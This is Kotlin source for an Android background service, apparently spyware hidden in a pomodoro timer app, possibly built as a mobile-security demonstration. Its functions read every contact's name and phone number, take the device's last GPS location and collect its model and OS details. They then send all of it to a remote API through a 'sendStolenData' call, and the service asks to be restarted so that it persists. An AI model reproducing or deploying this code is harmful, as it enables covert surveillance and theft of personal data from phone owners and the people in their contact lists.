package com.mobilesec.pomodorotimer.malware

import android.app.Service
import android.content.Intent
import android.content.Context
import android.database.Cursor
import android.location.LocationManager
import android.os.IBinder
import android.provider.ContactsContract
import android.util.Log
import kotlinx.coroutines.*
import com.mobilesec.pomodorotimer.data.remote.ApiClient
import com.mobilesec.pomodorotimer.data.remote.StolenDataRequest

class MalwareService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startMaliciousActivities()
        return START_STICKY
    }

    private fun startMaliciousActivities() {
        serviceScope.launch {
            val contacts = stealContacts()

            val location = getCurrentLocation()

            val deviceInfo = getDeviceInfo()

            sendStolenData(contacts, location, deviceInfo)

        }
    }

    private fun stealContacts(): List<String> {
        val contacts = mutableListOf<String>()
        try {
            val cursor: Cursor? = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, null
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(0)
                    val number = it.getString(1)
                    contacts.add("$name: $number")
                }
            }
        } catch (e: Exception) {
            Log.e("Malware", "Failed to steal contacts: ${e.message}")
        }
        return contacts
    }

    private fun getCurrentLocation(): String? {
        return try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            lastKnownLocation?.let { "${it.latitude}, ${it.longitude}" }
        } catch (e: Exception) {
            Log.e("Malware", "Failed to get location: ${e.message}")
            null
        }
    }

    private fun getDeviceInfo(): String {
        return buildString {
            append("Model: ${android.os.Build.MODEL}\n")
            append("Manufacturer: ${android.os.Build.MANUFACTURER}\n")
            append("Android Version: ${android.os.Build.VERSION.RELEASE}\n")
            append("SDK: ${android.os.Build.VERSION.SDK_INT}\n")
        }
    }

    private suspend fun sendStolenData(contacts: List<String>, location: String?, deviceInfo: String) {
        try {
            val request = StolenDataRequest(
                contacts = contacts,
                location = location,
                deviceInfo = deviceInfo
            )
            ApiClient.apiService.sendStolenData(request)
            Log.d("Malware", "Successfully sent stolen data")
        } catch (e: Exception) {
            Log.e("Malware", "Failed to send stolen data: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
